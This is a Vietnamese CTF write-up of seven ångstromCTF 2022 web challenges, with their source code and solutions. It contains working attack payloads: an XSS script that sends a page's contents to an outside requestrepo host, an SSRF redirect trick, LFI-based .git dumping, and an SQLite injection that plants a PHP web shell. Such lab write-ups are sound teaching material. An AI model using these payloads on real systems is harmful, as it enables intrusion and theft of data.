# ångstromCTF 2022

## Vui vẻ 🤣

Đây là kì CTF khá đặc biệt vì nó rơi vào dịp nghỉ lễ 30/4-1/5, nên lịch chơi của mình kiểu sáng đi chơi, tối làm CTF :v. Dẫu sao vẫn thấy học được gì đó. 🤓

Giờ tới writeup nào!

## [WEB] The Flash

![Oops](./images/%5BWEB%5D_TheFlash/description.jpg)

Đọc đề bài thì ta xác định được cần xem DOM/front-end thay đổi như thế nào.

Ở phía front-end ta có một file `flash.js`, file này đã được obfuscate. 

```js
const _0x15c166=_0x43fe;(function(_0x20ab81,_0xdea176){const _0x3bb316=_0x43fe,_0x25fbaf=_0x20ab81();while(!![]){try{const _0x58137d=-parseInt(_0x3bb316(0xd4,'H3tY'))/0x1+-parseInt(_0x3bb316(0xd7,'nwZz'))/0x2+parseInt(_0x3bb316(0xe1,'%[Nl'))/0x3+parseInt(_0x3bb316(0xd6,'ub7C'))/0x4*(-parseInt(_0x3bb316(0xe7,'3RP4'))/0x5)+parseInt(_0x3bb316(0xd9,'9V4u'))/0x6+parseInt(_0x3bb316(0xdf,'t*r!'))/0x7*(parseInt(_0x3bb316(0xcf,'SMMO'))/0x8)+parseInt(_0x3bb316(0xe2,'6%rI'))/0x9*(parseInt(_0x3bb316(0xe6,'3RP4'))/0xa);if(_0x58137d===_0xdea176)break;else _0x25fbaf['push'](_0x25fbaf['shift']());}catch(_0xa016d7){_0x25fbaf['push'](_0x25fbaf['shift']());}}}(_0x4733,0xacded));const x=document['getElementById'](_0x15c166(0xe5,'q!!U'));setInterval(()=>{const _0x24a935=_0x15c166;Math[_0x24a935(0xd1,'&EwH')]()<0.05&&(x[_0x24a935(0xdc,'1WY2')]=[0x73,0x71,0x80,0x6e,0x89,0x81,0x84,0x41,0x41,0x70,0x8b,0x65,0x78,0x43,0x79,0x6f,0x65,0x80,0x7c,0x41,0x65,0x6e,0x78,0x40,0x81,0x7c,0x87][_0x24a935(0xdb,'H3tY')](_0x4cabe2=>String[_0x24a935(0xd8,'Ceiy')](_0x4cabe2-0xd^0x7))[_0x24a935(0xe0,'1WY2')](''),setTimeout(()=>x[_0x24a935(0xe3,'5HF&')]=_0x24a935(0xde,'($xo'),0xa));},0x64);function _0x43fe(_0x297222,_0x4c5119){const _0x47338c=_0x4733();return _0x43fe=function(_0x43fe0d,_0x2873da){_0x43fe0d=_0x43fe0d-0xcf;let _0x3df1f6=_0x47338c[_0x43fe0d];if(_0x43fe['jYleOi']===undefined){var _0x484b33=function(_0x406fee){const _0x292a9c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2734de='',_0x46bc7d='';for(let _0x89c327=0x0,_0x3d5185,_0x35bd82,_0x15d96e=0x0;_0x35bd82=_0x406fee['charAt'](_0x15d96e++);~_0x35bd82&&(_0x3d5185=_0x89c327%0x4?_0x3d5185*0x40+_0x35bd82:_0x35bd82,_0x89c327++%0x4)?_0x2734de+=String['fromCharCode'](0xff&_0x3d5185>>(-0x2*_0x89c327&0x6)):0x0){_0x35bd82=_0x292a9c['indexOf'](_0x35bd82);}for(let _0x4f3ab1=0x0,_0x2b4484=_0x2734de['length'];_0x4f3ab1<_0x2b4484;_0x4f3ab1++){_0x46bc7d+='%'+('00'+_0x2734de['charCodeAt'](_0x4f3ab1)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x46bc7d);};const _0x4cabe2=function(_0x302eb2,_0x32783d){let _0x1fbce8=[],_0x4d57b4=0x0,_0x3fd440,_0x49491b='';_0x302eb2=_0x484b33(_0x302eb2);let _0x582ee5;for(_0x582ee5=0x0;_0x582ee5<0x100;_0x582ee5++){_0x1fbce8[_0x582ee5]=_0x582ee5;}for(_0x582ee5=0x0;_0x582ee5<0x100;_0x582ee5++){_0x4d57b4=(_0x4d57b4+_0x1fbce8[_0x582ee5]+_0x32783d['charCodeAt'](_0x582ee5%_0x32783d['length']))%0x100,_0x3fd440=_0x1fbce8[_0x582ee5],_0x1fbce8[_0x582ee5]=_0x1fbce8[_0x4d57b4],_0x1fbce8[_0x4d57b4]=_0x3fd440;}_0x582ee5=0x0,_0x4d57b4=0x0;for(let _0xbf0a0b=0x0;_0xbf0a0b<_0x302eb2['length'];_0xbf0a0b++){_0x582ee5=(_0x582ee5+0x1)%0x100,_0x4d57b4=(_0x4d57b4+_0x1fbce8[_0x582ee5])%0x100,_0x3fd440=_0x1fbce8[_0x582ee5],_0x1fbce8[_0x582ee5]=_0x1fbce8[_0x4d57b4],_0x1fbce8[_0x4d57b4]=_0x3fd440,_0x49491b+=String['fromCharCode'](_0x302eb2['charCodeAt'](_0xbf0a0b)^_0x1fbce8[(_0x1fbce8[_0x582ee5]+_0x1fbce8[_0x4d57b4])%0x100]);}return _0x49491b;};_0x43fe['aheYsv']=_0x4cabe2,_0x297222=arguments,_0x43fe['jYleOi']=!![];}const _0x2eb7bc=_0x47338c[0x0],_0xc73dee=_0x43fe0d+_0x2eb7bc,_0x2f959a=_0x297222[_0xc73dee];return!_0x2f959a?(_0x43fe['nusGzU']===undefined&&(_0x43fe['nusGzU']=!![]),_0x3df1f6=_0x43fe['aheYsv'](_0x3df1f6,_0x2873da),_0x297222[_0xc73dee]=_0x3df1f6):_0x3df1f6=_0x2f959a,_0x3df1f6;},_0x43fe(_0x297222,_0x4c5119);}function _0x4733(){const _0x562851=['j2nrWRvPfbn7','rKDEx8oeW6m','gSk4WQlcVCkOteCxq8kaiCo8','WPDTt8oVWPxcHNHdq8oWW5RcISob','W5z6vfL8Emk2fKyqh0S','ACobWQHmW63cTCksDrldUu7dSbm','ASofW6OnWQddTSoYFq','WPXcixtdT0PpW6fnbKLx','cSoyW41jW7bYWRrkW6BcGmoUWQm','Fe0yy2ZcQqFdHmoNe8oIAHe','W4zFo1iOuZVcMqXmW7Hu','WOOIfW','W63cLSobW5pcUYGnWP/cGW','FGhdPdFcVCk7aCkucmoIewi','FXD/WR0/lCk3WOhdPuuLnZVdOYjEo8k6CderudKhnZHw','lqdcImkwW5JcTCoi','W67cL8ogW5G','tSoTjd1mdSoXyfT7DKDq','WOpcSCo0WOtdJmkngSoPBNdcUfq','WPVcOHtdQ8oHWPaAxta','tttcLCkuWPZcPGxcJmkcWRxdTqZdHq','pSooW7hdGqu','WRxcUmkFgJpdVCoMW7Oo','WRBcVmkzxLtcISkDW6aujqdcUmke','gCktWR3dV8kaW7/dPrHCoCkLqmo9'];_0x4733=function(){return _0x562851;};return _0x4733();}
```

Mình sẽ dùng tính năng debugger trên trình duyệt để chạy từng câu lệnh và xem DOM thay đổi như thế nào:
```
actf{sp33dy_l1ke_th3_fl4sh}
```

## [WEB] Auth Skip

![Oops](./images/%5BWEB%5D_AuthSkip/description.jpg)

`index.js`:
```js
const express = require("express");
const path = require("path");
const cookieParser = require("cookie-parser");

const app = express();
const port = Number(process.env.PORT) || 8080;

const flag = process.env.FLAG || "actf{placeholder_flag}";

app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

app.post("/login", (req, res) => {
    if (
        req.body.username !== "admin" ||
        req.body.password !== Math.random().toString()
    ) {
        res.status(401).type("text/plain").send("incorrect login");
    } else {
        res.cookie("user", "admin");
        res.redirect("/");
    }
});

app.get("/", (req, res) => {
    if (req.cookies.user === "admin") {
        res.type("text/plain").send(flag);
    } else {
        res.sendFile(path.join(__dirname, "index.html"));
    }
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

Ở endpoint `/`, ta chỉ cần sửa cookie `user=admin` là đã lấy được flag:
```
actf{passwordless_authentication_is_the_new_hip_thing}
```

## [WEB]_crumbs

![Oops](./images/%5BWEB%5D_crumbs/description.jpg)

`index.js`:
```js
const express = require("express");
const crypto = require("crypto");

const app = express();
const port = Number(process.env.PORT) || 8080;

const flag = process.env.FLAG || "actf{placeholder_flag}";

const paths = {};
let curr = crypto.randomUUID();
let first = curr;

for (let i = 0; i < 1000; ++i) {
    paths[curr] = crypto.randomUUID();
    curr = paths[curr];
}

paths[curr] = "flag";

app.use(express.urlencoded({ extended: false }));

app.get("/:slug", (req, res) => {
    if (paths[req.params.slug] === "flag") {
        res.status(200).type("text/plain").send(flag);
    } else if (paths[req.params.slug]) {
        res.status(200)
            .type("text/plain")
            .send(`Go to ${paths[req.params.slug]}`);
    } else {
        res.status(200).type("text/plain").send("Broke the trail of crumbs...");
    }
});

app.get("/", (req, res) => {
    res.status(200).type("text/plain").send(`Go to ${first}`);
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

Sau khi xem xét source code trên thì dễ dàng thấy được có mảng `paths[]` giống như một danh sách liên kết đơn, cuối danh sách liên kết đơn chính là flag và endpoint `/` chính là phần đầu của danh sách. Nội dung của từng node chính là liên kết tới node kế tiếp. Vì vậy ta chỉ cần đi mãi cho tới khi có flag.

```py
import requests

url = 'https://crumbs.web.actf.co/'
nxt = ''
d = 0
while (True):
    d += 1
    print(f'{d}\t', end = ' ')

    r = requests.get(url + nxt).text
    print(r)
    if ('actf{' in r):
        break
    else:
        nxt = r.split()[2]
```

Chạy đoạn code trên rồi ngủ dậy là có flag á :))

![Oops](./images/%5BWEB%5D_crumbs/sleepy_cat.jpg)

Flag:
```
actf{w4ke_up_to_th3_m0on_6bdc10d7c6d5}
```

## Xtra Salty Sardines

![Oops](./images/%5BWEB%5D_XtraSaltySardines/description.jpg)

`index.js`:
```js
const express = require("express");
const path = require("path");
const fs = require("fs");
const cookieParser = require("cookie-parser");

const app = express();
const port = Number(process.env.PORT) || 8080;
const sardines = {};

const alpha = "abcdefghijklmnopqrstuvwxyz";

const secret = process.env.ADMIN_SECRET || "secretpw";
const flag = process.env.FLAG || "actf{placeholder_flag}";

function genId() {
    let ret = "";
    for (let i = 0; i < 10; i++) {
        ret += alpha[Math.floor(Math.random() * alpha.length)];
    }
    return ret;
}

app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

// the admin bot will be able to access this
app.get("/flag", (req, res) => {
    if (req.cookies.secret === secret) {
        res.send(flag);
    } else {
        res.send("you can't view this >:(");
    }
});

app.post("/mksardine", (req, res) => {
    if (!req.body.name) {
        res.status(400).type("text/plain").send("please include a name");
        return;
    }
    // no pesky chars allowed
    const name = req.body.name
        .replace("&", "&amp;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
        .replace("<", "&lt;")
        .replace(">", "&gt;");
    if (name.length === 0 || name.length > 2048) {
        res.status(400)
            .type("text/plain")
            .send("sardine name must be 1-2048 chars");
        return;
    }
    const id = genId();
    sardines[id] = name;
    res.redirect("/sardines/" + id);
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});


app.get("/sardines/:sardine", (req, res) => {
    const name = sardines[req.params.sardine];
    if (!name) {
        res.status(404).type("text/plain").send("sardine not found :(");
        return;
    }
    const sardine = fs
        .readFileSync(path.join(__dirname, "sardine.html"), "utf8")
        .replaceAll("$NAME", name.replaceAll("$", "$$$$"));
    res.type("text/html").send(sardine);
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

Đây là bài XSS cổ điển:
- B1: Tìm chỗ có thể inject được XSS, ở bài này là trường `name` ở `/sardine`.
- B2: Craft một payload XSS có thể bypass được tất cả filter.
- B3: Inject XSS và lấy URL dẫn tới page có XSS (`/sardines/:sardine`).
- B4: Report URL đó cho bot/admin.
Từ đó có thể lấy được nội dung mà người dùng bình thường không lấy được.

Giờ ta chỉ còn tìm cách bypass filter nữa là được. Ở bài này filter 2 tiêu chí:
- Tiêu chí 1: filter những kí tự không an toàn bao gồm `<>'"&`.
```js
const name = req.body.name
    .replace("&", "&amp;")
    .replace('"', "&quot;")
    .replace("'", "&apos;")
    .replace("<", "&lt;")
    .replace(">", "&gt;");
```
- Tiêu chí 2: độ dài `name` phải nằm trong đoạn [0..2048].
```js
if (name.length === 0 || name.length > 2048) {
    res.status(400)
        .type("text/plain")
        .send("sardine name must be 1-2048 chars");
    return;
}
```

Phần độ dài thì không đáng lo ngại lắm, tuy nhiên tiêu chí 1 làm mình phân vân rất lâu. Mình tưởng hàm `replace()` sẽ thay thế tất cả, nhưng thực ra nó chỉ thay thế kí tự đầu tiêu.

![Oops](./images/%5BWEB%5D_XtraSaltySardines/failed_filter_detection.jpg)

Nên payload của mình sẽ có dạng:
```html
<>"'& <script>...</script>
```

Dưới đây là payload của mình:

```html
<>"'& <script>fetch('https://xtra-salty-sardines.web.actf.co/flag').then((res)=>console.log(res.text().then((text)=>fetch("https://31zbgk0b.requestrepo.com?c="+btoa(text)))))</script>
```

Flag:
```
actf{those_sardines_are_yummy_yummy_in_my_tummy}
```

## [WEB] Art Gallery

![Oops](./images/%5BWEB%5D_ArtGallery/description.jpg)

`index.js`:

```js
const express = require('express');
const path = require("path");

const app = express();
const port = Number(process.env.PORT) || 8080;

app.get("/gallery", (req, res) => {
    res.sendFile(path.join(__dirname, "images", req.query.member), (err) => {
        res.sendFile(path.join(__dirname, "error.html"))
    });
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});
```

Ở endpoint `/gallery` ta thấy rằng có thể LFI thông qua parameter `member`.

```js
app.get("/gallery", (req, res) => {
    res.sendFile(path.join(__dirname, "images", req.query.member), (err) => {
        res.sendFile(path.join(__dirname, "error.html"))
    });
});
```

Thử nào:

![Oops](./images/%5BWEB%5D_ArtGallery/test_lfi.jpg)

Vì phần mô tả có đề cập tới việc git nên mình nghĩ tới việc có thể người làm app này có sử dụng git trong quá trình làm, vì bất cẩn nên các file/directory phục vụ cho git vẫn còn. Mình sẽ thử lấy nội dụng của các file git.

Các file phục vụ cho git nằm trong directory `.git`, và trong `.git` thì có một file là `HEAD`. Mình sẽ thử `GET /gallery?member=../.git/HEAD` (`../` để ra khỏi directory `images` - mình đoán `.git` ở đó 🤣)

![Oops](./images/%5BWEB%5D_ArtGallery/git_detection.jpg)

Tiếp theo, mình sử dụng tool [GitHacker](https://github.com/WangYihang/GitHacker). Tool này sẽ lấy nội dung của `.git` về máy mình.

```bash
$ githacker --url https://art-gallery.web.actf.co//gallery?member=../.git --output-folder result
```

Với `.git` vừa lấy được về, dùng lệnh `git log` để xem log commit.

<pre><font color="#4E9A06"><b>paml@ubuntu</b></font>:<font color="#3465A4"><b>~/result/2e6be8d2f7a452d4c2857465922cd272</b></font>$ git log
<font color="#C4A000">commit 1c584170fb33ae17a63e22456f19601efb1f23db (</font><font color="#06989A"><b>HEAD -&gt; </b></font><font color="#4E9A06"><b>master</b></font><font color="#C4A000">, </font><font color="#CC0000"><b>origin/master</b></font><font color="#C4A000">, </font><font color="#CC0000"><b>origin/HEAD</b></font><font color="#C4A000">)</font>
Author: imposter &lt;sus@aplet.me&gt;
Date:   Tue Apr 26 21:47:45 2022 -0400

    bury secrets

<font color="#C4A000">commit 713a4aba8af38c9507ced6ea41f602b105ca4101</font>
Author: imposter &lt;sus@aplet.me&gt;
Date:   Tue Apr 26 21:44:48 2022 -0400

    remove vital secrets

<font color="#C4A000">commit 56449caeb7973b88f20d67b4c343cbb895aa6bc7</font>
Author: imposter &lt;sus@aplet.me&gt;
Date:   Tue Apr 26 21:44:01 2022 -0400

    add program</pre>

Flag chắc là ở commit này rồi:
<pre><font color="#C4A000">commit 713a4aba8af38c9507ced6ea41f602b105ca4101</font>
Author: imposter &lt;sus@aplet.me&gt;
Date:   Tue Apr 26 21:44:48 2022 -0400

    remove vital secrets
</pre>

Tiếp theo dùng lệnh `git checkout <code>` để check commit:

<pre><font color="#4E9A06"><b>paml@ubuntu</b></font>:<font color="#3465A4"><b>~/result/2e6be8d2f7a452d4c2857465922cd272</b></font>$ git checkout 56449caeb7973b88f20d67b4c343cbb895aa6bc7
Previous HEAD position was 1c58417 bury secrets
HEAD is now at 56449ca add program
<font color="#4E9A06"><b>paml@ubuntu</b></font>:<font color="#3465A4"><b>~/result/2e6be8d2f7a452d4c2857465922cd272</b></font>$ ls
error.html  <font color="#3465A4"><b>images</b></font>      index.js      package-lock.json
flag.txt    index.html  package.json
<font color="#4E9A06"><b>paml@ubuntu</b></font>:<font color="#3465A4"><b>~/result/2e6be8d2f7a452d4c2857465922cd272</b></font>$ cat flag.txt
actf{lfi_me_alone_and_git_out_341n4kaf5u59v}</pre>

Flag: 
```
actf{lfi_me_alone_and_git_out_341n4kaf5u59v}
```

## [WEB] School Unblocker

![Oops](./images/%5BWEB%5D_SchoolUnblocker/description.jpg)

`index.js`:
```js
import express from "express";
import fetch from "node-fetch";
import path from "path";
import { fileURLToPath, URL } from "url";
import { resolve4 } from "dns/promises";

function isIpv4(str) {
    const chunks = str.split(".").map(x => parseInt(x, 10));
    return chunks.length === 4 && chunks.every(x => !isNaN(x) && x >= 0 && x < 256);
}

function isPublicIp(ip) {
    const chunks = ip.split(".").map(x => parseInt(x, 10));
    if ([127, 0, 10, 192].includes(chunks[0])) {
        return false;
    }
    if (chunks[0] == 172 && chunks[1] >= 16 && chunks[1] < 32) {
        return false;
    }
    return true;
}

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const app = express();
app.use(express.urlencoded({ extended: false }));

// environment config
const port = Number(process.env.PORT) || 8080;
const flag =
    process.env.FLAG ||
    "actf{someone_is_going_to_submit_this_out_of_desperation}";

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/proxy", async (req, res) => {
    try {
        const url = new URL(req.body.url);
        const originalHost = url.host;
        if (!isIpv4(url.hostname)) {
            const ips = await resolve4(url.hostname);
            // no dns rebinding today >:)
            url.hostname = ips[0];
        }
        if (!isPublicIp(url.hostname)) {
            res.type("text/html").send("<p>private ip contents redacted</p>");
        } else {
            const abort = new AbortController();
            setTimeout(() => abort.abort(), 3000);
            const resp = await fetch(url.toString(), {
                method: "POST",
                body: "ping=pong",
                headers: {
                    Host: originalHost,
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                signal: abort.signal,
            });
            res.type("text/html").send(await resp.text());
        }
    } catch (err) {
        res.status(400).type("text/plain").send("got error: " + err.message);
    }
});

// make flag accessible for local debugging purposes only
// also the nginx is at a private ip that isn't 127.0.0.1
// it's not that easy to get the flag :D
app.post("/flag", (req, res) => {
    if (!["127.0.0.1", "::ffff:127.0.0.1"].includes(req.socket.remoteAddress)) {
        res.status(400).type("text/plain").send("You don't get the flag!");
    } else {
        res.type("text/plain").send(flag);
    }
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});

```

Ta có 2 endpoint:
* `/proxy` (method: POST): ta có thể POST một URL lên. Nếu URL được gửi lên không phải là IPv4 thì được resolve thành IPv4. Nếu IPv4 đó là private IP thì sẽ bị chặn. Ngược lại, server sẽ POST tới IPv4 đó rồi trả response lại.
* `/flag` (method: POST): đây là endpoint trả về flag nếu `req.socket.remoteAddress` là `127.0.0.1` hoặc `::ffff:127.0.0.1`.

Mình có ý tưởng là sẽ host một server bằng [ngrok](https://ngrok.com/) rồi sau đó sẽ redirect về `http://127.0.0.1/flag`.
- Host bằng ngrok thì khi resolve thành IPv4 sẽ thành một public IP.
- Vì là redirect nên IP không bị ảnh hưởng, vẫn là IP public của server.

Server của mình như sau:
```py
from flask import Flask, redirect
import requests
  
app = Flask(__name__)
  
@app.route('/', methods=["POST"])
def hello_world():
    return redirect("http://127.0.0.1:8080/flag", 308) # redirect reuse method

if __name__ == '__main__':
    app.run()
```

Ta cần gửi POST request tới `/flag`, nếu sử dụng `redirect("http://127.0.0.1:8080/flag")` thì sẽ là method GET, còn nếu truyền thêm status code 308 hoặc 307 thì sẽ giữ nguyên được method.

![OOPS](./images/%5BWEB%5D_SchoolUnblocker/308_status_code.jpg)

Tóm lại,
- B1: host một server bằng đoạn code trên bằng ngrok.
- B2: gửi url từ ngrok lên endpoint /proxy
response nhận được chính là flag.

**Exploitation**:
```bash
$ python3 app.py # Run server, server will run on port 5000
```
```bash
$ ngrok http 5000 # Setup ngrok
...
Web Interface                 http://127.0.0.1:4040
Forwarding                    http://4b31-113-161-64-254.ngrok.io -> http://localhost:5000            
Forwarding                    https://4b31-113-161-64-254.ngrok.io -> http://localhost:5000
...                              
```
```bash
$ curl -X POST -d 'url=http://4b31-113-161-64-254.ngrok.io' 'https://school-unblocker.web.actf.co/proxy' # POST URL got from ngrok
actf{dont_authenticate_via_ip_please}
```

Flag:
```
actf{dont_authenticate_via_ip_please}
```

## [WEB] Secure Vault

![Oops](./images/%5BWEB%5D_SecureVault/description.jpg)

`index.js`:

```js
const express = require("express");
const path = require("path");
const fs = require("fs");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");

const app = express();
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

// environment config
const port = Number(process.env.PORT) || 8080;
const flag =
    process.env.FLAG ||
    "actf{someone_is_going_to_submit_this_out_of_desperation}";

const userInfo = {};
const jwtKey = Math.random().toString();

class UserStore {
    constructor() {
        this.users = {};
        this.usernames = {};
    }

    insert(username, password) {
        const uid = Math.random().toString();
        this.users[uid] = {
            username,
            uid,
            password,
            vault: "put something here!",
            restricted: true,
        };
        this.usernames[username] = uid;
        return uid;
    }

    get(uid) {
        return this.users[uid] ?? {};
    }

    lookup(username) {
        return this.usernames[username];
    }

    remove(uid) {
        const user = this.get(uid);
        delete this.usernames[user.username];
        delete this.users[uid];
    }
}

function escape(str) {
    return str
        .replaceAll("&", "&amp;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&apos;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;");
}

const users = new UserStore();

app.use((req, res, next) => {
    try {
        res.locals.user = jwt.verify(req.cookies.token, jwtKey, {
            algorithms: ["HS256"],
        });
    } catch (err) {
        if (req.cookies.token) {
            res.clearCookie("token");
        }
    }
    next();
});

app.get("/", (req, res) => {
    res.type("text/html").send(fs.readFileSync(path.join(__dirname, res.locals.user ? "authed.html" : "index.html"), "utf8"));
});

app.post("/register", (req, res) => {
    if (
        !req.body.username ||
        !req.body.password ||
        req.body.username.length > 32 ||
        req.body.password.length > 32
    ) {
        res.redirect(
            "/?e=" +
                encodeURIComponent("Username and password must be 1-32 chars")
        );
        return;
    }
    if (users.lookup(req.body.username)) {
        res.redirect(
            "/?e=" +
                encodeURIComponent(
                    "Account already exists, please log in instead"
                )
        );
        return;
    }
    const uid = users.insert(req.body.username, req.body.password);
    res.cookie("token", jwt.sign({ uid }, jwtKey, { algorithm: "HS256" }));
    res.redirect("/");
});

app.post("/login", (req, res) => {
    const user = users.get(users.lookup(req.body.username));
    if (user && user.password === req.body.password) {
        res.cookie(
            "token",
            jwt.sign({ uid: user.uid }, jwtKey, { algorithm: "HS256" })
        );
        res.redirect("/");
    } else {
        res.redirect("/?e=" + encodeURIComponent("Invalid username/password"));
    }
});

app.post("/delete", (req, res) => {
    if (res.locals.user) {
        users.remove(res.locals.user.uid);
    }
    res.clearCookie("token");
    res.redirect("/");
});

app.get("/vault", (req, res) => {
    if (!res.locals.user) {
        res.status(401).send("Log in first");
        return;
    }
    const user = users.get(res.locals.user.uid);
    res.type("text/plain").send(user.restricted ? user.vault : flag);
});

app.post("/vault", (req, res) => {
    if (!res.locals.user) {
        res.status(401).send("Log in first");
        return;
    }
    if (!req.body.vault || req.body.vault.length > 2000) {
        res.redirect("/?e=" + encodeURIComponent("Vault must be 1-2000 chars"));
        return;
    }
    users.get(res.locals.user.uid).vault = req.body.vault;
    res.redirect("/");
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
```

App của bài này có các tính năng sau:
- `/register`: Đăng kí account. Mỗi user sẽ có một uid.
- `/login`: Dùng để đăng nhập :v
- `/vault`: Lưu một đoạn text nhỏ cho user - kiểu như note ấy.
- `/delete`: Xóa account của user hiện tại.

Server của bài này sử dụng [JWT](https://jwt.io/introduction).

Vì phần source code có vẻ rườm rà rắc rối, rất khó liên kết các chức năng nên mình sẽ đi ngược từ chỗ lấy flag.

```js
app.get("/vault", (req, res) => {
    if (!res.locals.user) {
        res.status(401).send("Log in first");
        return;
    }
    const user = users.get(res.locals.user.uid);
    res.type("text/plain").send(user.restricted ? user.vault : flag);
});
```

Từ đây mình nghĩ cách để `user.restricted` thuộc vào nhóm [falsy](https://developer.mozilla.org/en-US/docs/Glossary/Falsy).

Ta lại đi ngược lên dòng:
```js
const user = users.get(res.locals.user.uid);
```

Trong đó `res.locals.user` chính là thông tin chứng thực từ JWT. Xem middleware sau để hiểu rõ hơn.
```js
app.use((req, res, next) => {
    try {
        res.locals.user = jwt.verify(req.cookies.token, jwtKey, {
            algorithms: ["HS256"],
        });
    } catch (err) {
        if (req.cookies.token) {
            res.clearCookie("token");
        }
    }
    next();
});
```

Method `get()` như sau:

```js
class UserStore {
    ...
    get(uid) {
        return this.users[uid] ?? {};
    }
    ...
}
```

Lúc làm tới đây mình hơi bí, mình có nghĩ tới prototype pollution các thứ mà không khả thi. Sau đó, tự dưng mình nghĩ tới chuyện xóa user rồi thì cái JWT của user đã xóa vẫn được verify, vì cái middleware nãy không có check user có trong array không. 

Vì vậy, nếu dùng JWT của user đã xóa thì `this.users[uid] ?? {};` sẽ trở thành:
```js
this.users[uid] ?? {}
// trở thành
undefined ?? {} // trả về {}
```

Lúc đó ta sẽ có giá trị falsy:

![Oops](./images/%5BWEB%5D_SecureVault/falsy_detection.jpg)

Vậy là đạt được mục đích rồi 🤓

Tóm lại:
- B1: Đăng kí một tài khoản, rồi đăng nhập lấy JWT.
- B2: Xóa tài khoản vừa tạo.
- B3: Thêm JWT vừa lấy được ở B1.
- B4: Refresh page, lấy flag và 🥳.

Flag:
```
actf{is_this_what_uaf_is}
```

## [WEB] No Flags?

![Oops](./images/%5BWEB%5D_NoFlags/description.jpg)

`index.php`:
```php
<?php session_start(); ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>No Flags?</title>
    <style>
        body {
            background-color: #f8bbd0;
        }

        h1, h2, li, input {
            color: #560027;
        }
        
        h1, h2 {
            font-family: sans-serif;
        }

        h1 {
            font-size: 36px;
        }

        h2 {
            font-size: 30px;
        }

        li, input {
            font-size: 24px;
            font-family: monospace;
        }

        input {
            background: none;
            border: 1px solid #880e4f;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>List of Fake Flags</h1>
    <ul>
    <?php
        if (!isset($_SESSION["DBNAME"])) {
            $dbname = hash("sha256", (string) rand());
            $_SESSION["DBNAME"] = $dbname;
            $init = true;
        } else {
            $dbname = $_SESSION["DBNAME"];
            $init = false;
        }
        $pdo = new PDO("sqlite:/tmp/$dbname.db");
        if ($init) {
            $pdo->exec("CREATE TABLE Flags (flag string); INSERT INTO Flags VALUES ('actf{not_the_flag}'), ('actf{maybe_the_flag}')");
        }
        if (isset($_POST["flag"])) {
            $flag = $_POST["flag"];
            $pdo->exec("INSERT INTO Flags VALUES ('$flag');");
        }
        foreach ($pdo->query("SELECT * FROM Flags") as $row) {
            echo "<li>" . htmlspecialchars($row["flag"]) . "</li>";
        }
    ?>
    </ul>
    <h2>Add a Fake Flag</h2>
    <form action="/" method="POST">
        <input type="text" name="flag" placeholder="flag...">
        <input type="submit" value="Add">
    </form>
</body>
</html>
```

`Dockerfile`:
```Docker
FROM php:8.1.5-apache-bullseye

# executable that prints the flag
COPY printflag /printflag
RUN chmod 111 /printflag
COPY src /var/www/html

RUN chown -R root:root /var/www/html && chmod -R 555 /var/www/html
RUN mkdir /var/www/html/abyss &&\
    chown -R root:root /var/www/html/abyss &&\
    chmod -R 333 abyss

EXPOSE 80
```

Thoạt nhìn qua Dockerfile ta thấy răng cần phải thực thi `/printflag`, rồi nhìn qua file `index.php` và phần mô tả thì đây khá chắc là sẽ khai thác lỗ hổng SQL Injection mà còn phải code execution được. 🤔

```php
# SQL Injection here
if (isset($_POST["flag"])) {
    $flag = $_POST["flag"];
    $pdo->exec("INSERT INTO Flags VALUES ('$flag');");
}
```

Trước giờ làm về SQLite Injection mình đều tham khảo cheatsheet sau: [SQLite Injection](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet).

Dù biết là cần phải code execution nhưng mình vẫn thử fuzz database ra bằng hai câu lệnh:
```SQL
SELECT name FROM sqlite_master WHERE type='table' 
SELECT sql FROM sqlite_master WHERE type='table'  
```
Nhưng vẫn không có gì ngoài table `Flags` và những data mà mình gửi lên. 

Tra ở cheatsheet thì thấy có payload: [Giải thích](https://twosixtech.com/sqlite-as-a-shell-script/#background)
```
1';ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘’;-- --requires either direct database access or (non-default) stacked query option enabled
```

Quay lại Dockerfile thì thấy có directory: `/var/www/html/abyss` là có thể ghi được.
```Docker
RUN mkdir /var/www/html/abyss &&\
    chown -R root:root /var/www/html/abyss &&\
    chmod -R 333 abyss
```

Mình sẽ craft lại payload cho phù hợp:
```
');ATTACH DATABASE '/var/www/html/abyss/LMAP.php' AS LMAP; CREATE TABLE LMAP.hh (dataz text); INSERT INTO LMAP.hh (dataz) VALUES('<?php system($_GET[288]); ?>');--
```

Sau đó GET tới `https://no-flags.web.actf.co/abyss/LMAP.php?288=/printflag` là lấy được flag.

Flag:
```
actf{why_do_people_still_use_php} 
```